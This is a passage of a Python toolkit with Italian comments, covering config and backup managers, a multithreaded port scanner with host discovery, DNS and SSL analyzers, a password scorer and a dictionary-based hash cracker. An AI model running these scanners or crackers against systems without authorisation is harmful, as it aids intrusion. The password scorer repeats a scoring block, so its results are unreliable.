            print(f"[VAULT] Change password error: {e}")
            return False


# ==============================================================================
# EMAIL CONFIG MANAGER
# ==============================================================================

class EmailConfigManager:
    """Gestione sicura configurazione email"""
    
    def __init__(self, config_path: Path = EMAIL_CONFIG_FILE):
        self.config_path = config_path
        self._config: Dict = {}
        self._lock = threading.RLock()
        self._load()
    
    def _load(self):
        if self.config_path.exists():
            try:
                with open(self.config_path, "r", encoding="utf-8") as f:
                    self._config = json.load(f)
            except Exception:
                self._config = {}
    
    def _save(self):
        try:
            self.config_path.parent.mkdir(parents=True, exist_ok=True)
            with atomic_write(str(self.config_path)) as f:
                json.dump(self._config, f, indent=2, ensure_ascii=False)
        except Exception as e:
            print(f"[EMAIL CONFIG] Save error: {e}")
    
    def configure(self, sender: str, password: str,
                 smtp_server: str = "smtp.gmail.com",
                 smtp_port: int = 587,
                 imap_server: str = "imap.gmail.com",
                 imap_port: int = 993) -> bool:
        with self._lock:
            self._config = {
                "sender": sender,
                "password": password,
                "smtp_server": smtp_server,
                "smtp_port": smtp_port,
                "imap_server": imap_server,
                "imap_port": imap_port,
                "configured_at": datetime.now().isoformat(),
            }
            self._save()
        return True
    
    def get(self, key: str = None) -> Any:
        with self._lock:
            if key is None:
                return copy.deepcopy(self._config)
            return self._config.get(key)
    
    def is_configured(self) -> bool:
        return bool(self._config.get("sender") and self._config.get("password"))
    
    def clear(self):
        with self._lock:
            self._config = {}
            if self.config_path.exists():
                self.config_path.unlink()


# ==============================================================================
# BACKUP MANAGER
# ==============================================================================

class BackupManager:
    """
    Gestore backup con:
    - Backup incrementale
    - Compressione ZIP
    - Rotazione automatica
    - Restore selettivo
    """
    
    def __init__(self, backup_dir: Path = BACKUP_DIR):
        self.backup_dir = backup_dir
        self.backup_dir.mkdir(parents=True, exist_ok=True)
        self._lock = threading.RLock()
    
    def backup_file(self, source_path: str) -> Optional[str]:
        """Backup single file"""
        source = Path(source_path)
        if not source.exists():
            return None
        
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"{source.name}_{ts}.bak"
        backup_path = self.backup_dir / backup_name
        
        try:
            shutil.copy2(source, backup_path)
            return str(backup_path)
        except Exception as e:
            print(f"[BACKUP] File error: {e}")
            return None
    
    def backup_directory(self, source_dir: str,
                        exclude_patterns: List[str] = None) -> Optional[str]:
        """Backup entire directory as ZIP"""
        source = Path(source_dir)
        if not source.exists() or not source.is_dir():
            return None
        
        exclude_patterns = exclude_patterns or [
            "__pycache__", "*.pyc", ".git", "node_modules",
            "venv", ".venv", "*.tmp", "*.bak"
        ]
        
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"{source.name}_{ts}.zip"
        backup_path = self.backup_dir / backup_name
        
        try:
            with zipfile.ZipFile(backup_path, "w", zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(source):
                    dirs[:] = [d for d in dirs 
                              if not any(fnmatch.fnmatch(d, p) for p in exclude_patterns)]
                    
                    for file in files:
                        if any(fnmatch.fnmatch(file, p) for p in exclude_patterns):
                            continue
                        
                        file_path = Path(root) / file
                        arcname = file_path.relative_to(source.parent)
                        zf.write(file_path, arcname)
            
            return str(backup_path)
        except Exception as e:
            print(f"[BACKUP] Directory error: {e}")
            return None
    
    def list_backups(self) -> List[Dict]:
        """List all backups with metadata"""
        backups = []
        for path in self.backup_dir.glob("*"):
            if path.is_file():
                stat = path.stat()
                backups.append({
                    "name": path.name,
                    "path": str(path),
                    "size_bytes": stat.st_size,
                    "size_human": format_bytes(stat.st_size),
                    "created": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                })
        
        return sorted(backups, key=lambda x: x["created"], reverse=True)
    
    def restore(self, backup_path: str, destination: str) -> bool:
        """Restore backup to destination"""
        backup = Path(backup_path)
        if not backup.exists():
            return False
        
        dest = Path(destination)
        
        try:
            if backup.suffix == ".zip":
                dest.mkdir(parents=True, exist_ok=True)
                with zipfile.ZipFile(backup, "r") as zf:
                    zf.extractall(dest)
            else:
                # Single file backup
                shutil.copy2(backup, dest)
            return True
        except Exception as e:
            print(f"[BACKUP] Restore error: {e}")
            return False
    
    def delete_backup(self, backup_name: str) -> bool:
        """Delete a specific backup"""
        path = self.backup_dir / backup_name
        if path.exists():
            try:
                path.unlink()
                return True
            except Exception as _e:
                pass  # suppressed error
        return False
    
    def cleanup_old_backups(self, max_age_days: int = 30,
                           max_count: int = 50) -> int:
        """Remove old backups beyond limits"""
        backups = self.list_backups()
        deleted = 0
        cutoff = datetime.now() - timedelta(days=max_age_days)
        
        # Delete by age
        for backup in backups:
            created = datetime.fromisoformat(backup["created"])
            if created < cutoff:
                if self.delete_backup(backup["name"]):
                    deleted += 1
        
        # Keep only N most recent
        remaining = self.list_backups()
        if len(remaining) > max_count:
            for backup in remaining[max_count:]:
                if self.delete_backup(backup["name"]):
                    deleted += 1
        
        return deleted
    
    def get_total_size(self) -> int:
        """Total size of all backups in bytes"""
        total = 0
        for path in self.backup_dir.rglob("*"):
            if path.is_file():
                total += path.stat().st_size
        return total
    
    def get_statistics(self) -> Dict:
        backups = self.list_backups()
        total_size = self.get_total_size()
        return {
            "count": len(backups),
            "total_size_bytes": total_size,
            "total_size_human": format_bytes(total_size),
            "backup_dir": str(self.backup_dir),
            "oldest": backups[-1]["created"] if backups else None,
            "newest": backups[0]["created"] if backups else None,
        }


print("[✓] Database, Cache, Config, Memory, Vault, Backup loaded")

# ==============================================================================
# PARTE 5: CYBERSECURITY MODULE
# ==============================================================================

# ==============================================================================
# NETWORK SCANNER
# ==============================================================================

class NetworkScanner:
    """
    Scanner di rete avanzato con:
    - Port scanning multithreaded TCP
    - Service detection con banner grabbing
    - Host discovery via ping
    - Subnet scanning
    - OS fingerprinting base
    """
    
    # Top 100 porte più comuni
    TOP_PORTS = [
        21, 22, 23, 25, 53, 80, 110, 111, 135, 139,
        143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080,
        20, 67, 68, 69, 119, 123, 137, 138, 161, 162,
        389, 465, 514, 515, 587, 636, 873, 902, 1080, 1194,
        1433, 1521, 1701, 1812, 1813, 2049, 2082, 2083, 2086, 2087,
        2095, 2096, 3128, 3268, 3269, 4444, 5000, 5060, 5061, 5432,
        5666, 5722, 5800, 5985, 6000, 6379, 6660, 6667, 6697, 7070,
        8000, 8008, 8081, 8088, 8443, 8888, 9000, 9090, 9100, 9200,
        9300, 10000, 11211, 27017, 27018, 27019, 50000, 50070, 8009, 8161
    ]
    
    def __init__(self, max_threads: int = 50, timeout: float = 1.0):
        self.max_threads = max_threads
        self.timeout = timeout
        self._lock = threading.Lock()
        self._stop_event = threading.Event()
    
    def scan_port(self, host: str, port: int, 
                  grab_banner: bool = True) -> Optional[NetworkScanResult]:
        """Scan a single port with optional banner grabbing"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            start = time.perf_counter()
            result = sock.connect_ex((host, port))
            latency = (time.perf_counter() - start) * 1000  # ms
            
            if result == 0:
                service = COMMON_PORTS.get(port, "unknown")
                banner = ""
                version = ""
                
                if grab_banner:
                    try:
                        sock.settimeout(0.5)
                        # Try to receive banner
                        banner_bytes = sock.recv(1024)
                        banner = banner_bytes.decode("utf-8", errors="replace").strip()
                        
                        # Per HTTP, manda richiesta
                        if port in [80, 8080, 8000, 8888]:
                            sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                            response = sock.recv(2048).decode("utf-8", errors="replace")
                            # Extract Server header
                            for line in response.split("\r\n"):
                                if line.lower().startswith("server:"):
                                    version = line.split(":", 1)[1].strip()
                                    break
                    except Exception as _e:
                        pass  # suppressed error
                
                sock.close()
                
                return NetworkScanResult(
                    host=host, port=port, state="open",
                    service=service, version=version,
                    latency=latency,
                    metadata={"banner": banner[:200] if banner else ""}
                )
            
            sock.close()
            return None
        
        except Exception:
            return None
    
    def scan_ports(self, host: str, ports: List[int] = None,
                  progress_callback: Callable = None) -> List[NetworkScanResult]:
        """
        Multithreaded port scan
        Returns list of open ports
        """
        if ports is None:
            ports = self.TOP_PORTS
        
        # Resolve hostname
        try:
            ip = socket.gethostbyname(host)
        except socket.gaierror:
            return []
        
        results = []
        self._stop_event.clear()
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            future_to_port = {
                executor.submit(self.scan_port, ip, port): port
                for port in ports
            }
            
            completed = 0
            total = len(ports)
            
            for future in concurrent.futures.as_completed(future_to_port):
                if self._stop_event.is_set():
                    break
                
                completed += 1
                if progress_callback:
                    progress_callback(completed, total)
                
                try:
                    result = future.result()
                    if result:
                        results.append(result)
                except Exception as _e:
                    pass  # suppressed error
        
        # Sort by port number
        results.sort(key=lambda r: r.port)
        return results
    
    def scan_range(self, host: str, start_port: int, end_port: int,
                  progress_callback: Callable = None) -> List[NetworkScanResult]:
        """Scan a range of ports"""
        ports = list(range(start_port, end_port + 1))
        return self.scan_ports(host, ports, progress_callback)
    
    def quick_scan(self, host: str) -> List[NetworkScanResult]:
        """Quick scan - only top 20 ports"""
        return self.scan_ports(host, self.TOP_PORTS[:20])
    
    def full_scan(self, host: str) -> List[NetworkScanResult]:
        """Full scan - all 65535 ports (SLOW!)"""
        return self.scan_range(host, 1, 65535)
    
    def host_discovery(self, network: str,
                      progress_callback: Callable = None) -> List[str]:
        """
        Discover live hosts in a network (e.g., '192.168.1.0/24')
        Uses TCP connect on common ports as ping alternative
        """
        try:
            base_ip, cidr = network.split("/")
            cidr = int(cidr)
        except Exception:
            return []
        
        # Calculate IP range
        base_parts = base_ip.split(".")
        if len(base_parts) != 4:
            return []
        
        if cidr < 24:
            # Too large, default to /24
            cidr = 24
        
        host_bits = 32 - cidr
        num_hosts = 2 ** host_bits - 2  # exclude network/broadcast
        
        base = ".".join(base_parts[:3])
        ips = [f"{base}.{i}" for i in range(1, min(255, num_hosts + 1))]
        
        live_hosts = []
        
        def is_alive(ip: str) -> Optional[str]:
            # Try common ports
            for port in [80, 443, 22, 445]:
                if is_port_open(ip, port, timeout=0.3):
                    return ip
            return None
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            future_to_ip = {executor.submit(is_alive, ip): ip for ip in ips}
            
            completed = 0
            total = len(ips)
            
            for future in concurrent.futures.as_completed(future_to_ip):
                completed += 1
                if progress_callback:
                    progress_callback(completed, total)
                
                try:
                    result = future.result()
                    if result:
                        live_hosts.append(result)
                except Exception as _e:
                    pass  # suppressed error
        
        return sorted(live_hosts, key=lambda ip: tuple(map(int, ip.split("."))))
    
    def ping_host(self, host: str) -> Dict:
        """Ping a host (cross-platform)"""
        try:
            if IS_WINDOWS:
                cmd = ["ping", "-n", "4", "-w", "1000", host]
            else:
                cmd = ["ping", "-c", "4", "-W", "1", host]
            
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=10
            )
            
            output = result.stdout
            
            # Parse times (basic)
            times = []
            for line in output.split("\n"):
                match = re.search(r"time[<=](\d+\.?\d*)\s*ms", line, re.IGNORECASE)
                if match:
                    times.append(float(match.group(1)))
            
            return {
                "host": host,
                "alive": result.returncode == 0,
                "ping_times": times,
                "avg_ms": sum(times) / len(times) if times else 0,
                "min_ms": min(times) if times else 0,
                "max_ms": max(times) if times else 0,
                "loss_percent": 0 if times else 100,
                "raw_output": output[:500],
            }
        except subprocess.TimeoutExpired:
            return {"host": host, "alive": False, "error": "timeout"}
        except Exception as e:
            return {"host": host, "alive": False, "error": str(e)}
    
    def traceroute(self, host: str, max_hops: int = 30) -> List[Dict]:
        """Traceroute to host"""
        try:
            if IS_WINDOWS:
                cmd = ["tracert", "-h", str(max_hops), "-w", "1000", host]
            else:
                cmd = ["traceroute", "-m", str(max_hops), "-w", "1", host]
            
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=60
            )
            
            hops = []
            for line in result.stdout.split("\n"):
                # Match hop number and IP
                match = re.match(r"\s*(\d+).*?(\d+\.\d+\.\d+\.\d+)", line)
                if match:
                    hop_num = int(match.group(1))
                    ip = match.group(2)
                    
                    # Extract times
                    times = re.findall(r"(\d+)\s*ms", line)
                    
                    hops.append({
                        "hop": hop_num,
                        "ip": ip,
                        "times_ms": [int(t) for t in times],
                    })
            
            return hops
        except Exception as e:
            return [{"error": str(e)}]
    
    def stop(self):
        """Stop ongoing scan"""
        self._stop_event.set()


# ==============================================================================
# DNS & WHOIS TOOLS
# ==============================================================================

class DNSAnalyzer:
    """DNS lookup, reverse DNS, MX, TXT, etc."""
    
    @staticmethod
    def lookup(hostname: str, record_type: str = "A") -> List[str]:
        """DNS lookup of various record types"""
        try:
            if DEPENDENCIES_STATUS.get('dnspython'):
                import dns.resolver
                resolver = dns.resolver.Resolver()
                resolver.timeout = 5
                resolver.lifetime = 10
                
                answers = resolver.resolve(hostname, record_type)
                return [str(answer) for answer in answers]
            else:
                # Fallback for A record only
                if record_type == "A":
                    return [socket.gethostbyname(hostname)]
                return []
        except Exception as e:
            return []
    
    @staticmethod
    def reverse_lookup(ip: str) -> Optional[str]:
        """Reverse DNS lookup"""
        try:
            return socket.gethostbyaddr(ip)[0]
        except (socket.herror, socket.gaierror):
            return None
    
    @staticmethod
    def get_mx_records(domain: str) -> List[str]:
        """Get MX records (mail servers)"""
        return DNSAnalyzer.lookup(domain, "MX")
    
    @staticmethod
    def get_txt_records(domain: str) -> List[str]:
        """Get TXT records (SPF, DKIM, etc)"""
        return DNSAnalyzer.lookup(domain, "TXT")
    
    @staticmethod
    def get_ns_records(domain: str) -> List[str]:
        """Get name servers"""
        return DNSAnalyzer.lookup(domain, "NS")
    
    @staticmethod
    def full_lookup(hostname: str) -> Dict:
        """Comprehensive DNS lookup"""
        return {
            "hostname": hostname,
            "A": DNSAnalyzer.lookup(hostname, "A"),
            "AAAA": DNSAnalyzer.lookup(hostname, "AAAA"),
            "MX": DNSAnalyzer.lookup(hostname, "MX"),
            "NS": DNSAnalyzer.lookup(hostname, "NS"),
            "TXT": DNSAnalyzer.lookup(hostname, "TXT"),
            "CNAME": DNSAnalyzer.lookup(hostname, "CNAME"),
        }
    
    @staticmethod
    def whois_lookup(domain: str) -> Dict:
        """WHOIS information lookup"""
        if DEPENDENCIES_STATUS.get('python-whois') and whois:
            try:
                w = whois.whois(domain)
                return {
                    "domain": domain,
                    "registrar": str(w.registrar) if w.registrar else "",
                    "creation_date": str(w.creation_date) if w.creation_date else "",
                    "expiration_date": str(w.expiration_date) if w.expiration_date else "",
                    "name_servers": list(w.name_servers) if w.name_servers else [],
                    "status": list(w.status) if w.status else [],
                    "country": w.country if hasattr(w, 'country') else "",
                    "org": w.org if hasattr(w, 'org') else "",
                }
            except Exception as e:
                return {"error": str(e)}
        
        # Fallback: use whois command if available
        try:
            result = subprocess.run(
                ["whois", domain], capture_output=True, text=True, timeout=10
            )
            return {"raw": result.stdout[:2000]}
        except Exception:
            return {"error": "whois not available"}


# ==============================================================================
# SSL/TLS CERTIFICATE ANALYZER
# ==============================================================================

class SSLAnalyzer:
    """Analyze SSL/TLS certificates"""
    
    @staticmethod
    def get_certificate(hostname: str, port: int = 443) -> Optional[Dict]:
        """Get SSL certificate info"""
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((hostname, port), timeout=10) as sock:
                with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    version = ssock.version()
                    
                    # Parse subject and issuer
                    subject = dict(x[0] for x in cert.get('subject', []))
                    issuer = dict(x[0] for x in cert.get('issuer', []))
                    
                    # Parse dates
                    not_before = cert.get('notBefore', '')
                    not_after = cert.get('notAfter', '')
                    
                    try:
                        expiry = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                        days_remaining = (expiry - datetime.now()).days
                    except Exception:
                        days_remaining = -1
                    
                    return {
                        "hostname": hostname,
                        "subject": subject,
                        "issuer": issuer,
                        "serial_number": cert.get('serialNumber', ''),
                        "version": cert.get('version', ''),
                        "not_before": not_before,
                        "not_after": not_after,
                        "days_remaining": days_remaining,
                        "expired": days_remaining < 0,
                        "expiring_soon": 0 <= days_remaining < 30,
                        "tls_version": version,
                        "cipher": cipher[0] if cipher else "",
                        "cipher_bits": cipher[2] if cipher else 0,
                        "san": cert.get('subjectAltName', []),
                    }
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def check_protocols(hostname: str, port: int = 443) -> Dict:
        """Check which TLS protocols are supported"""
        results = {}
        
        protocols = [
            ("TLSv1.3", ssl.TLSVersion.TLSv1_3),
            ("TLSv1.2", ssl.TLSVersion.TLSv1_2),
            ("TLSv1.1", ssl.TLSVersion.TLSv1_1),
            ("TLSv1.0", ssl.TLSVersion.TLSv1),
        ]
        
        for name, protocol in protocols:
            try:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                
                try:
                    ctx.minimum_version = protocol
                    ctx.maximum_version = protocol
                except (AttributeError, ValueError):
                    continue
                
                with socket.create_connection((hostname, port), timeout=5) as sock:
                    with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                        results[name] = "supported"
            except Exception:
                results[name] = "not supported"
        
        return results
    
    @staticmethod
    def analyze_security(hostname: str) -> Dict:
        """Security analysis of HTTPS endpoint"""
        cert = SSLAnalyzer.get_certificate(hostname)
        
        if not cert or "error" in cert:
            return {"error": "Cannot retrieve certificate"}
        
        protocols = SSLAnalyzer.check_protocols(hostname)
        
        issues = []
        score = 100
        
        # Check expiry
        if cert.get("expired"):
            issues.append({"severity": "critical", "issue": "Certificate expired"})
            score -= 50
        elif cert.get("expiring_soon"):
            issues.append({"severity": "warning", "issue": "Certificate expiring within 30 days"})
            score -= 10
        
        # Check TLS version
        tls_v = cert.get("tls_version", "")
        if "1.0" in tls_v or "1.1" in tls_v:
            issues.append({"severity": "high", "issue": f"Outdated TLS version: {tls_v}"})
            score -= 30
        
        # Check deprecated protocols
        for proto in ["TLSv1.0", "TLSv1.1"]:
            if protocols.get(proto) == "supported":
                issues.append({"severity": "medium", "issue": f"Deprecated {proto} supported"})
                score -= 10
        
        # Check cipher strength
        cipher_bits = cert.get("cipher_bits", 0)
        if cipher_bits < 128:
            issues.append({"severity": "high", "issue": f"Weak cipher ({cipher_bits} bits)"})
            score -= 25
        
        return {
            "hostname": hostname,
            "certificate": cert,
            "supported_protocols": protocols,
            "security_score": max(0, score),
            "grade": SSLAnalyzer._score_to_grade(max(0, score)),
            "issues": issues,
        }
    
    @staticmethod
    def _score_to_grade(score: int) -> str:
        if score >= 90: return "A+"
        if score >= 80: return "A"
        if score >= 70: return "B"
        if score >= 60: return "C"
        if score >= 50: return "D"
        return "F"


# ==============================================================================
# PASSWORD STRENGTH ANALYZER
# ==============================================================================

class PasswordAnalyzer:
    """Analyze password strength using multiple criteria"""
    
    COMMON_PASSWORDS = {
        "password", "123456", "12345678", "qwerty", "abc123",
        "monkey", "letmein", "dragon", "111111", "baseball",
        "iloveyou", "trustno1", "1234567", "sunshine", "master",
        "welcome", "shadow", "ashley", "football", "jesus",
        "michael", "ninja", "mustang", "password1", "admin",
        "root", "user", "guest", "test", "demo",
        "password123", "qwerty123", "1q2w3e4r", "passw0rd",
        "12345", "1234", "123", "test123", "asdfgh",
    }
    
    COMMON_PATTERNS = [
        r"^[a-z]+$",  # lowercase only
        r"^[A-Z]+$",  # uppercase only
        r"^\d+$",  # digits only
        r"^(.)\1+$",  # repeated character
        r"(012|123|234|345|456|567|678|789|890)",  # ascending digits
        r"(987|876|765|654|543|432|321|210)",  # descending digits
        r"(abc|bcd|cde|def|efg|fgh|ghi|hij)",  # ascending letters
    ]
    
    @staticmethod
    def analyze(password: str) -> PasswordAnalysis:
        """Comprehensive password analysis"""
        length = len(password)
        
        has_lower = bool(re.search(r"[a-z]", password))
        has_upper = bool(re.search(r"[A-Z]", password))
        has_digit = bool(re.search(r"\d", password))
        has_special = bool(re.search(r"[!@#$%^&*()_+\-=\[\]{};':\"\\|,.<>/?]", password))
        
        # Check common patterns
        has_pattern = False
        for pattern in PasswordAnalyzer.COMMON_PATTERNS:
            if re.search(pattern, password.lower()):
                has_pattern = True
                break
        
        # Check if it's a common password
        is_common = password.lower() in PasswordAnalyzer.COMMON_PASSWORDS
        
        # Calculate score
        score = 0
        suggestions = []
        
        # Length scoring
        if length < 6:
            score += 5
            suggestions.append("Usa almeno 12 caratteri")
        elif length < 8:
            score += 15
            suggestions.append("Aumenta la lunghezza ad almeno 12 caratteri")
        elif length < 12:
            score += 30
            suggestions.append("Consigliata lunghezza di 16+ caratteri")
        elif length < 16:
            score += 45
        else:
            score += 55
        
        # Character variety
        variety = sum([has_lower, has_upper, has_digit, has_special])
        if variety == 1:
            score += 5
            suggestions.append("Aggiungi più caratteri diversi")
        elif variety == 2:
            score += 15
            suggestions.append("Aggiungi più tipi di caratteri")
        elif variety == 3:
            score += 30
        # Character variety
        variety = sum([has_lower, has_upper, has_digit, has_special])
        if variety == 1:
            score += 5
            suggestions.append("Aggiungi maiuscole, numeri e simboli speciali")
        elif variety == 2:
            score += 15
            suggestions.append("Aggiungi più tipi di caratteri")
        elif variety == 3:
            score += 25
            if not has_special:
                suggestions.append("Aggiungi caratteri speciali (!@#$%)")
        else:
            score += 35
        
        # Penalties
        if is_common:
            score = min(score, 10)
            suggestions.append("Password troppo comune, scegli qualcosa di unico")
        
        if has_pattern:
            score = max(0, score - 20)
            suggestions.append("Evita pattern prevedibili (123, abc, aaa)")
        
        # Entropia calcolo
        charset_size = 0
        if has_lower: charset_size += 26
        if has_upper: charset_size += 26
        if has_digit: charset_size += 10
        if has_special: charset_size += 32
        
        if charset_size > 0:
            entropy = length * math.log2(charset_size)
            if entropy > 80:
                score = min(100, score + 10)
        
        # Determine strength label
        if score < 20:
            strength = "molto debole"
        elif score < 40:
            strength = "debole"
        elif score < 60:
            strength = "discreta"
        elif score < 80:
            strength = "forte"
        else:
            strength = "eccellente"
        
        return PasswordAnalysis(
            password=password,
            length=length,
            score=min(100, score),
            strength=strength,
            has_lowercase=has_lower,
            has_uppercase=has_upper,
            has_digits=has_digit,
            has_special=has_special,
            has_common_pattern=has_pattern or is_common,
            suggestions=suggestions,
        )
    
    @staticmethod
    def estimate_crack_time(password: str) -> Dict:
        """Estimate time to crack via brute force"""
        charset_size = 0
        if re.search(r"[a-z]", password): charset_size += 26
        if re.search(r"[A-Z]", password): charset_size += 26
        if re.search(r"\d", password): charset_size += 10
        if re.search(r"[!@#$%^&*()_+\-=\[\]{};':\"\\|,.<>/?]", password): charset_size += 32
        
        if charset_size == 0:
            return {"error": "Empty password"}
        
        # Combinazioni possibili
        combinations = charset_size ** len(password)
        
        # Velocità ipotetiche (guess per secondo)
        speeds = {
            "online_throttled": 100,            # 100/sec
            "online_unthrottled": 1_000,        # 1k/sec
            "offline_slow_hash": 10_000,        # 10k/sec
            "offline_fast_hash": 1_000_000_000, # 1B/sec (GPU)
            "offline_extreme": 100_000_000_000, # 100B/sec (cluster)
        }
        
        results = {}
        for scenario, speed in speeds.items():
            seconds = combinations / (2 * speed)  # average half
            results[scenario] = PasswordAnalyzer._format_time(seconds)
        
        return {
            "password_length": len(password),
            "charset_size": charset_size,
            "combinations": combinations,
            "scenarios": results,
        }
    
    @staticmethod
    def _format_time(seconds: float) -> str:
        if seconds < 1:
            return "istantaneo"
        if seconds < 60:
            return f"{seconds:.1f} secondi"
        if seconds < 3600:
            return f"{seconds / 60:.1f} minuti"
        if seconds < 86400:
            return f"{seconds / 3600:.1f} ore"
        if seconds < 31_536_000:
            return f"{seconds / 86400:.1f} giorni"
        if seconds < 31_536_000_000:
            return f"{seconds / 31_536_000:.1f} anni"
        if seconds < 31_536_000_000_000:
            return f"{seconds / 31_536_000_000:.0f} millenni"
        return f"{seconds / 31_536_000_000:.2e} millenni"


# ==============================================================================
# HASH IDENTIFIER & CRACKER (DIZIONARIO)
# ==============================================================================

class HashAnalyzer:
    """Identify hash types and dictionary-based cracking"""
    
    HASH_SIGNATURES = {
        32: ["MD5", "MD4", "MD2", "NTLM"],
        40: ["SHA1", "RIPEMD-160"],
        56: ["SHA224"],
        64: ["SHA256", "SHA3-256", "BLAKE2s"],
        96: ["SHA384", "SHA3-384"],
        128: ["SHA512", "SHA3-512", "BLAKE2b", "Whirlpool"],
    }
    
    @staticmethod
    def identify(hash_string: str) -> List[str]:
        """Identify possible hash types based on length and characters"""
        hash_clean = hash_string.strip()
        length = len(hash_clean)
        
        # Bcrypt
        if hash_clean.startswith(("$2a$", "$2b$", "$2y$")):
            return ["bcrypt"]
        
        # Argon2
        if hash_clean.startswith("$argon2"):
            return ["Argon2"]
        
        # PBKDF2 (Django/Python format)
        if hash_clean.startswith("pbkdf2_"):
            return ["PBKDF2"]
        
        # SHA-crypt
        if hash_clean.startswith(("$5$", "$6$")):
            return ["SHA-256 crypt" if hash_clean.startswith("$5$") else "SHA-512 crypt"]
        
        # MD5 crypt
        if hash_clean.startswith("$1$"):
            return ["MD5 crypt"]
        
        # NTLM with $NT$
        if hash_clean.startswith("$NT$"):
            return ["NTLM"]
        
        # Verifica caratteri esadecimali
        if re.match(r"^[a-fA-F0-9]+$", hash_clean):
            candidates = HashAnalyzer.HASH_SIGNATURES.get(length, [])
            if candidates:
                return candidates
        
        return ["unknown"]
    
    @staticmethod
    def hash_string(text: str, algorithm: str) -> str:
        """Hash a string with specified algorithm"""
        text_bytes = text.encode() if isinstance(text, str) else text
        algorithm_lower = algorithm.lower().replace("-", "").replace("_", "")
        
        algorithms_map = {
            "md5": hashlib.md5,
            "sha1": hashlib.sha1,
            "sha224": hashlib.sha224,
            "sha256": hashlib.sha256,
            "sha384": hashlib.sha384,
            "sha512": hashlib.sha512,
            "sha3256": hashlib.sha3_256,
            "sha3512": hashlib.sha3_512,
            "blake2s": hashlib.blake2s,
            "blake2b": hashlib.blake2b,
        }
        
        hasher = algorithms_map.get(algorithm_lower)
        if not hasher:
            return ""
        
        return hasher(text_bytes).hexdigest()
    
    @staticmethod
    def dictionary_attack(hash_target: str, algorithm: str,
                         wordlist: List[str] = None,
                         max_attempts: int = 100000) -> Optional[str]:
        """
        Dictionary-based hash cracking.
        Returns password if found, None otherwise.
        """
        if wordlist is None:
            # Default basic wordlist
            wordlist = list(PasswordAnalyzer.COMMON_PASSWORDS) + [
                "admin", "administrator", "root", "toor", "pass",
                "test", "guest", "user", "demo", "12345",
                "qwertyuiop", "asdfghjkl", "zxcvbnm",
            ]
            
            # Aggiungi varianti con cifre
            base_words = list(wordlist)
            for word in base_words:
                for i in range(10):
                    wordlist.append(f"{word}{i}")
                    wordlist.append(f"{i}{word}")
                for year in range(2015, 2027):
                    wordlist.append(f"{word}{year}")
                wordlist.append(word.capitalize())
                wordlist.append(word.upper())
                wordlist.append(word + "!")
                wordlist.append(word + "123")
        
        hash_target_lower = hash_target.lower()
        attempts = 0
        
        for word in wordlist:
            if attempts >= max_attempts:
                break
            attempts += 1
            
            computed = HashAnalyzer.hash_string(word, algorithm)
            if computed.lower() == hash_target_lower:
                return word
        
        return None
    
    @staticmethod
    def crack_md5(hash_target: str, wordlist: List[str] = None) -> Dict:
        """Specialized MD5 cracker"""
        start = time.perf_counter()
        result = HashAnalyzer.dictionary_attack(hash_target, "md5", wordlist)
        elapsed = time.perf_counter() - start
        
        return {
            "hash": hash_target,
            "algorithm": "md5",
            "cracked": result is not None,
            "password": result,
            "time_seconds": round(elapsed, 3),
        }


# ==============================================================================
# HTTP SECURITY HEADERS ANALYZER
# ==============================================================================

class HTTPSecurityAnalyzer:
    """Analyze HTTP security headers"""
    
    SECURITY_HEADERS = {
        "Strict-Transport-Security": {
            "severity": "high",
            "description": "Forza HTTPS via HSTS",
            "recommended": "max-age=31536000; includeSubDomains",
        },
        "Content-Security-Policy": {
            "severity": "high",
            "description": "Previene XSS e injection",
            "recommended": "default-src 'self'",
        },
        "X-Frame-Options": {
            "severity": "medium",
            "description": "Previene clickjacking",
            "recommended": "DENY o SAMEORIGIN",
        },
        "X-Content-Type-Options": {
            "severity": "medium",
            "description": "Previene MIME-sniffing",
            "recommended": "nosniff",
        },
        "Referrer-Policy": {
            "severity": "low",
            "description": "Controlla informazioni referrer",
            "recommended": "strict-origin-when-cross-origin",
        },
        "Permissions-Policy": {
            "severity": "low",
            "description": "Controlla API browser",
            "recommended": "geolocation=(), microphone=()",
        },
        "X-XSS-Protection": {
            "severity": "low",
            "description": "Legacy XSS protection",
            "recommended": "1; mode=block",
        },
    }
    
    @staticmethod
    def analyze(url: str) -> Dict:
        """Analyze HTTP security headers of a URL"""
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        
        try:
            req = urllib.request.Request(
                url, headers={"User-Agent": USER_AGENT}, method="HEAD"
            )
            with urllib.request.urlopen(req, timeout=10) as resp:
                headers = dict(resp.headers)
                status_code = resp.status
        except urllib.error.HTTPError as e:
            headers = dict(e.headers) if hasattr(e, 'headers') else {}
            status_code = e.code
        except Exception as e:
            return {"error": str(e), "url": url}
        
        # Verifica security headers
        present = {}
        missing = []
        score = 100
        
        for header, info in HTTPSecurityAnalyzer.SECURITY_HEADERS.items():
            header_value = None
            for h in headers:
                if h.lower() == header.lower():
                    header_value = headers[h]
                    break
            
            if header_value:
                present[header] = header_value
            else:
                missing.append({
                    "header": header,
                    "severity": info["severity"],
                    "description": info["description"],
                    "recommended": info["recommended"],
                })
                
                if info["severity"] == "high":
                    score -= 20
                elif info["severity"] == "medium":
                    score -= 10
                else:
                    score -= 5
        
        # Verifica info disclosure
        info_disclosure = []
        for sensitive in ["Server", "X-Powered-By", "X-AspNet-Version"]:
            for h in headers:
                if h.lower() == sensitive.lower():
